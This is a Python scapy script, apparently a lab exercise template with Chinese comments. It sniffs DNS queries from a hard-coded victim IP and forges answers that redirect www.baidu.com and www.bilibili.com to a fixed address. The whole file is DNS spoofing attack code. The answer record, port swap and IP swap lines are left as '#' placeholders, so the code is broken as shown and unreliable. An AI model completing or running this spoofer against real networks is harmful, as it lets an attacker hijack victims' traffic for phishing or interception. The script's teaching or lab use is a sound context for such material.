# -*- coding: utf-8 -*-
from struct import pack
from xdrlib import Packer
from scapy.all import *
import sys

dns_hosts = {
    b"www.baidu.com.": "8.136.83.180",
    b"www.bilibili.com.": "8.136.83.180",
}
victimip = '192.168.43.112'
# dns包 = Ether()/IP()/UDP()/DNS(id,qr,opcode,rd，qd=DNSQR(qnname=dns_name), verbose=False) 
# id标识 匹配请求与回应 qr 0表示查询报文 opcode 0表示标准查询 rd 1表示递归

def DNS_Spoof(data):
    try:
        # print(data.summary())
        if data.haslayer(DNSQR) and data[DNS].qd.qname in dns_hosts.keys(): 
            print("[Query]:\t",data.summary())
            req_domain = data[DNS].qd.qname
            packet = data.copy()
            packet[DNS].ancount = 1 # set the answer count to 1
            packet[DNS].qr=1 # Message is a response
            packet[DNS].ra=1 # Server can do recursive query
            packet[DNS].rcode=0
            packet[DNS].an = #
            
            packet[UDP].sport, packet[UDP].dport = #, #

            packet[IP].src, packet[IP].dst = #, #

            # delete checksums and length of packet, because we have modified the packet
            # new calculations are required ( scapy will do automatically )
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum
            print("[Response]\t",packet.summary())
            sendp(packet)
        else:
            pass
    except Exception as e:
        pass


def DNS_S(iface):
    # count	需要捕获的包的个数，0 代表无限
    # store	是否需要存储捕获到的包
    # filter	指定嗅探规则过滤，遵循 BPF （伯克利封包过滤器）
    # timeout	指定超时时间
    # iface	指定嗅探的网络接口或网络接口列表，默认为 None，即在所有网络接口上嗅探
    # prn	传入一个可调用对象，将会应用到每个捕获到的数据包上，如果有返回值，那么它不会显示
    # offline	从 pcap 文件读取包数据而不是通过嗅探的方式获得
    sniff(prn=DNS_Spoof,filter="udp and src net {}".format(victimip),iface=iface)


if __name__ == '__main__':
    DNS_S('Intel(R) Wi-Fi 6E AX211 160MHz')
